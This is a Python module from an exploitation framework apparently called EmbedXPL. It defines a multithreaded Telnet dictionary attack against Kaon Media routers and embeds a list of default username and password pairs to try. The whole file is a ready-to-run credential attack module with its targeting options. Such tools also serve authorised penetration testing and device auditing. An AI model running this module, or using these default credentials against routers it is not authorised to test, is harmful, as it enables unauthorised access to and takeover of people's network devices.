# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Kaon Media Router Default Telnet Creds",
        "description": "Dictionary attack with default credentials against Kaon Media Router Telnet service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Kaon Media Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:123456789,admin:Cl@r0,admin:user,user:123456789,user:Cl@r0", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
